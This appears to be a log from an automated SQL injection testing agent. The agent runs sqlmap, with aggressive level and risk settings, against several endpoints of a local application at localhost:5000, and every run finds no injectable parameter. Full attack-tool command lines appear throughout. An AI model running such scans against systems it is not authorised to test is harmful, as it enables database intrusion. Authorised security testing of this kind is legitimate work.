[18:57:51] [INFO] testing 'IBM DB2 boolean-based blind - ORDER BY clause (original value)'
[18:57:51] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
[18:57:52] [INFO] testing 'MySQL >= 5.0 boolean-based blind - Stacked queries'
[18:57:53] [INFO] testing 'MySQL < 5.0 boolean-based blind - Stacked queries'
[18:57:53] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries'
[18:57:54] [INFO] testing 'PostgreSQL boolean-based blind - Stacked queries (GENERATE_SERIES)'
[18:57:54] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries (IF)'
[18:57:55] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Stacked queries'
[18:57:56] [INFO] testing 'Oracle boolean-based blind - Stacked queries'
[18:57:56] [INFO] testing 'Microsoft Access boolean-based blind - Stacked queries'
[18:57:57] [INFO] testing 'SAP MaxDB boolean-based blind - Stacked queries'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:57:58] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:57:59] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
[18:57:59] [INFO] testing 'MySQL UNION query (NULL) - 1 to 10 columns'
[18:58:00] [INFO] testing 'MySQL UNION query (random number) - 1 to 10 columns'
[18:58:01] [WARNING] GET parameter 'url' does not seem to be injectable
[18:58:01] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:58:01] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 2384 times

[*] ending @ 18:58:01 /2025-09-26/

2025-09-26 18:58:01,287 - INFO - No clear injection detected during discovery for http://localhost:5000/proxy
2025-09-26 18:58:01,287 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/page
2025-09-26 18:58:08,137 - INFO -         ___
2025-09-26 18:58:08,137 - INFO -        __H__
2025-09-26 18:58:08,137 - INFO -  ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:08,137 - INFO - |_ -| . ["]     | .'| . |
2025-09-26 18:58:08,153 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:58:08,153 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:08,153 - INFO - 
2025-09-26 18:58:08,178 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:08,178 - INFO - 
2025-09-26 18:58:08,178 - INFO - [*] starting @ 18:58:08 /2025-09-26/
2025-09-26 18:58:08,178 - INFO - 
2025-09-26 18:58:10,605 - INFO - [18:58:10] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:58:10,605 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:58:10,612 - INFO - [18:58:10] [INFO] flushing session file
2025-09-26 18:58:10,632 - INFO - [18:58:10] [INFO] testing connection to the target URL
2025-09-26 18:58:10,727 - INFO - [18:58:10] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:58:10,749 - INFO - [18:58:10] [INFO] testing if the target URL content is stable
2025-09-26 18:58:11,167 - INFO - [18:58:11] [INFO] target URL content is stable
2025-09-26 18:58:11,167 - INFO - [18:58:11] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:58:11,227 - INFO - [18:58:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
2025-09-26 18:58:11,263 - INFO - [18:58:11] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:58:11,284 - INFO - [18:58:11] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:58:11,439 - INFO - [18:58:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:58:11,584 - INFO - [18:58:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:58:11,627 - INFO - [18:58:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:58:11,694 - INFO - [18:58:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:58:11,751 - INFO - [18:58:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:58:11,816 - INFO - [18:58:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:58:11,881 - INFO - [18:58:11] [INFO] testing 'Generic inline queries'
2025-09-26 18:58:11,899 - INFO - [18:58:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:58:11,934 - INFO - [18:58:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:58:11,983 - INFO - [18:58:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:58:12,037 - INFO - [18:58:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:58:12,094 - INFO - [18:58:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:58:12,140 - INFO - [18:58:12] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:58:12,196 - INFO - [18:58:12] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:58:12,254 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:58:12,264 - INFO - [18:58:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:58:12,343 - INFO - [18:58:12] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:58:12,349 - INFO - [18:58:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:58:12,349 - INFO - [18:58:12] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:12,360 - INFO - 404 (Not Found) - 73 times
2025-09-26 18:58:12,360 - INFO - 
2025-09-26 18:58:12,367 - INFO - [*] ending @ 18:58:12 /2025-09-26/
2025-09-26 18:58:12,370 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/page
--------------------------------------------------
        ___
       __H__
 ___ ___[,]_____ ___ ___  {1.9.9.4#dev}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:08 /2025-09-26/

[18:58:10] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:58:10] [INFO] flushing session file
[18:58:10] [INFO] testing connection to the target URL
[18:58:10] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:58:10] [INFO] testing if the target URL content is stable
[18:58:11] [INFO] target URL content is stable
[18:58:11] [INFO] testing if URI parameter '#1*' is dynamic
[18:58:11] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:58:11] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:58:11] [INFO] testing for SQL injection on URI parameter '#1*'
[18:58:11] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:58:11] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:58:11] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:58:11] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:58:11] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:58:11] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:58:11] [INFO] testing 'Generic inline queries'
[18:58:11] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:58:11] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:58:11] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:58:12] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:58:12] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:58:12] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:58:12] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:58:12] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:58:12] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:58:12] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:58:12] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 73 times

[*] ending @ 18:58:12 /2025-09-26/

2025-09-26 18:58:12,591 - INFO - Flushed sqlmap session for http://localhost:5000/page (log: attack-logs-dynamic\Page_flush.log)
2025-09-26 18:58:12,591 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/page?p=test' --output-dir 'attack-logs-dynamic\Page_sqlmap' --batch --level=5 --risk=3 --threads 5 -p p --technique BU
2025-09-26 18:58:16,488 - INFO -         ___
2025-09-26 18:58:16,488 - INFO -        __H__
2025-09-26 18:58:16,488 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:16,489 - INFO - |_ -| . [(]     | .'| . |
2025-09-26 18:58:16,489 - INFO - |___|_  [,]_|_|_|__,|  _|
2025-09-26 18:58:16,489 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:16,490 - INFO - 
2025-09-26 18:58:16,515 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:16,515 - INFO - 
2025-09-26 18:58:16,515 - INFO - [*] starting @ 18:58:16 /2025-09-26/
2025-09-26 18:58:16,515 - INFO - 
2025-09-26 18:58:18,390 - INFO - [18:58:18] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Page_sqlmap' as the output directory
2025-09-26 18:58:19,028 - INFO - [18:58:19] [INFO] testing connection to the target URL
2025-09-26 18:58:19,148 - INFO - [18:58:19] [CRITICAL] page not found (404)
2025-09-26 18:58:19,148 - INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
2025-09-26 18:58:19,148 - INFO - [18:58:19] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:19,148 - INFO - 404 (Not Found) - 1 times
2025-09-26 18:58:19,148 - INFO - 
2025-09-26 18:58:19,148 - INFO - [*] ending @ 18:58:19 /2025-09-26/
2025-09-26 18:58:19,148 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/page?p=test' --output-dir 'attack-logs-dynamic\Page_sqlmap' --batch --level=5 --risk=3 --threads 5 -p p --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [(]     | .'| . |
|___|_  [,]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:16 /2025-09-26/

[18:58:18] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Page_sqlmap' as the output directory
[18:58:19] [INFO] testing connection to the target URL
[18:58:19] [CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
[18:58:19] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times

[*] ending @ 18:58:19 /2025-09-26/

2025-09-26 18:58:19,320 - INFO - No clear injection detected during discovery for http://localhost:5000/page
2025-09-26 18:58:19,320 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/files
2025-09-26 18:58:22,800 - INFO -         ___
2025-09-26 18:58:22,800 - INFO -        __H__
2025-09-26 18:58:22,800 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:22,801 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:58:22,801 - INFO - |___|_  [)]_|_|_|__,|  _|
2025-09-26 18:58:22,801 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:22,801 - INFO - 
2025-09-26 18:58:22,812 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:22,812 - INFO - 
2025-09-26 18:58:22,828 - INFO - [*] starting @ 18:58:22 /2025-09-26/
2025-09-26 18:58:22,828 - INFO - 
2025-09-26 18:58:25,122 - INFO - [18:58:25] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:58:25,122 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:58:25,132 - INFO - [18:58:25] [INFO] flushing session file
2025-09-26 18:58:25,143 - INFO - [18:58:25] [INFO] testing connection to the target URL
2025-09-26 18:58:25,153 - INFO - [18:58:25] [CRITICAL] page not found (404)
2025-09-26 18:58:25,153 - INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
2025-09-26 18:58:25,153 - INFO - [18:58:25] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:25,153 - INFO - 404 (Not Found) - 1 times
2025-09-26 18:58:25,153 - INFO - 
2025-09-26 18:58:25,153 - INFO - [*] ending @ 18:58:25 /2025-09-26/
2025-09-26 18:58:25,153 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/files
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:22 /2025-09-26/

[18:58:25] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:58:25] [INFO] flushing session file
[18:58:25] [INFO] testing connection to the target URL
[18:58:25] [CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
[18:58:25] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times

[*] ending @ 18:58:25 /2025-09-26/

2025-09-26 18:58:25,168 - INFO - Flushed sqlmap session for http://localhost:5000/files (log: attack-logs-dynamic\Files_flush.log)
2025-09-26 18:58:25,168 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/files?filename=test' --output-dir 'attack-logs-dynamic\Files_sqlmap' --batch --level=5 --risk=3 --threads 5 -p filename --technique BU
2025-09-26 18:58:28,670 - INFO -         ___
2025-09-26 18:58:28,670 - INFO -        __H__
2025-09-26 18:58:28,670 - INFO -  ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:28,670 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 18:58:28,670 - INFO - |___|_  ["]_|_|_|__,|  _|
2025-09-26 18:58:28,670 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:28,670 - INFO - 
2025-09-26 18:58:28,698 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:28,698 - INFO - 
2025-09-26 18:58:28,698 - INFO - [*] starting @ 18:58:28 /2025-09-26/
2025-09-26 18:58:28,698 - INFO - 
2025-09-26 18:58:30,671 - INFO - [18:58:30] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Files_sqlmap' as the output directory
2025-09-26 18:58:31,276 - INFO - [18:58:31] [INFO] testing connection to the target URL
2025-09-26 18:58:31,349 - INFO - [18:58:31] [CRITICAL] page not found (404)
2025-09-26 18:58:31,379 - INFO - it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
2025-09-26 18:58:31,379 - INFO - [18:58:31] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:31,379 - INFO - 404 (Not Found) - 1 times
2025-09-26 18:58:31,379 - INFO - 
2025-09-26 18:58:31,379 - INFO - [*] ending @ 18:58:31 /2025-09-26/
2025-09-26 18:58:31,379 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/files?filename=test' --output-dir 'attack-logs-dynamic\Files_sqlmap' --batch --level=5 --risk=3 --threads 5 -p filename --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[.]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:28 /2025-09-26/

[18:58:30] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Files_sqlmap' as the output directory
[18:58:31] [INFO] testing connection to the target URL
[18:58:31] [CRITICAL] page not found (404)
it is not recommended to continue in this kind of cases. Do you want to quit and make sure that everything is set up properly? [Y/n] Y
[18:58:31] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 1 times

[*] ending @ 18:58:31 /2025-09-26/

2025-09-26 18:58:31,379 - INFO - No clear injection detected during discovery for http://localhost:5000/files
2025-09-26 18:58:31,379 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/products/search
2025-09-26 18:58:34,720 - INFO -         ___
2025-09-26 18:58:34,720 - INFO -        __H__
2025-09-26 18:58:34,720 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:34,720 - INFO - |_ -| . [,]     | .'| . |
2025-09-26 18:58:34,720 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:58:34,720 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:34,720 - INFO - 
2025-09-26 18:58:34,748 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 18:58:34,748 - INFO - 
2025-09-26 18:58:34,748 - INFO - [*] starting @ 18:58:34 /2025-09-26/
2025-09-26 18:58:34,748 - INFO - 
2025-09-26 18:58:37,068 - INFO - [18:58:37] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 18:58:37,068 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 18:58:37,078 - INFO - [18:58:37] [INFO] testing connection to the target URL
2025-09-26 18:58:37,148 - INFO - [18:58:37] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 18:58:37,158 - INFO - [18:58:37] [INFO] testing if the target URL content is stable
2025-09-26 18:58:37,605 - INFO - [18:58:37] [INFO] target URL content is stable
2025-09-26 18:58:37,605 - INFO - [18:58:37] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 18:58:37,652 - INFO - [18:58:37] [WARNING] URI parameter '#1*' does not appear to be dynamic
2025-09-26 18:58:37,666 - INFO - [18:58:37] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 18:58:37,698 - INFO - [18:58:37] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 18:58:37,797 - INFO - [18:58:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 18:58:37,915 - INFO - [18:58:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 18:58:37,936 - INFO - [18:58:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 18:58:37,994 - INFO - [18:58:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
2025-09-26 18:58:38,049 - INFO - [18:58:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
2025-09-26 18:58:38,112 - INFO - [18:58:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
2025-09-26 18:58:38,165 - INFO - [18:58:38] [INFO] testing 'Generic inline queries'
2025-09-26 18:58:38,175 - INFO - [18:58:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
2025-09-26 18:58:38,226 - INFO - [18:58:38] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
2025-09-26 18:58:38,258 - INFO - [18:58:38] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
2025-09-26 18:58:38,299 - INFO - [18:58:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
2025-09-26 18:58:38,358 - INFO - [18:58:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
2025-09-26 18:58:38,405 - INFO - [18:58:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
2025-09-26 18:58:38,453 - INFO - [18:58:38] [INFO] testing 'Oracle AND time-based blind'
2025-09-26 18:58:38,499 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 18:58:38,499 - INFO - [18:58:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 18:58:38,537 - INFO - [18:58:38] [WARNING] reflective value(s) found and filtering out
2025-09-26 18:58:38,553 - INFO - [18:58:38] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 18:58:38,564 - INFO - [18:58:38] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 18:58:38,565 - INFO - [18:58:38] [WARNING] HTTP error codes detected during run:
2025-09-26 18:58:38,565 - INFO - 404 (Not Found) - 4 times, 500 (Internal Server Error) - 69 times
2025-09-26 18:58:38,565 - INFO - 
2025-09-26 18:58:38,565 - INFO - [*] ending @ 18:58:38 /2025-09-26/
2025-09-26 18:58:38,565 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' --batch --flush-session -u http://localhost:5000/products/search
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [,]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 18:58:34 /2025-09-26/

[18:58:37] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[18:58:37] [INFO] testing connection to the target URL
[18:58:37] [INFO] checking if the target is protected by some kind of WAF/IPS
[18:58:37] [INFO] testing if the target URL content is stable
[18:58:37] [INFO] target URL content is stable
[18:58:37] [INFO] testing if URI parameter '#1*' is dynamic
[18:58:37] [WARNING] URI parameter '#1*' does not appear to be dynamic
[18:58:37] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[18:58:37] [INFO] testing for SQL injection on URI parameter '#1*'
[18:58:37] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[18:58:37] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[18:58:37] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[18:58:37] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[18:58:38] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[18:58:38] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[18:58:38] [INFO] testing 'Generic inline queries'
[18:58:38] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[18:58:38] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[18:58:38] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[18:58:38] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[18:58:38] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[18:58:38] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[18:58:38] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[18:58:38] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[18:58:38] [WARNING] reflective value(s) found and filtering out
[18:58:38] [WARNING] URI parameter '#1*' does not seem to be injectable
[18:58:38] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[18:58:38] [WARNING] HTTP error codes detected during run:
404 (Not Found) - 4 times, 500 (Internal Server Error) - 69 times

[*] ending @ 18:58:38 /2025-09-26/

2025-09-26 18:58:38,700 - INFO - Flushed sqlmap session for http://localhost:5000/products/search (log: attack-logs-dynamic\Search_for_a_product_flush.log)
2025-09-26 18:58:38,710 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u 'http://localhost:5000/products/search?name=test' --output-dir 'attack-logs-dynamic\Search_for_a_product_sqlmap' --batch --level=5 --risk=3 --threads 5 -p name --technique BU
2025-09-26 18:58:41,957 - INFO -         ___
2025-09-26 18:58:41,957 - INFO -        __H__
2025-09-26 18:58:41,957 - INFO -  ___ ___[']_____ ___ ___  {1.9.9.4#dev}
2025-09-26 18:58:41,957 - INFO - |_ -| . [']     | .'| . |
2025-09-26 18:58:41,957 - INFO - |___|_  [']_|_|_|__,|  _|
2025-09-26 18:58:41,957 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 18:58:41,957 - INFO - 
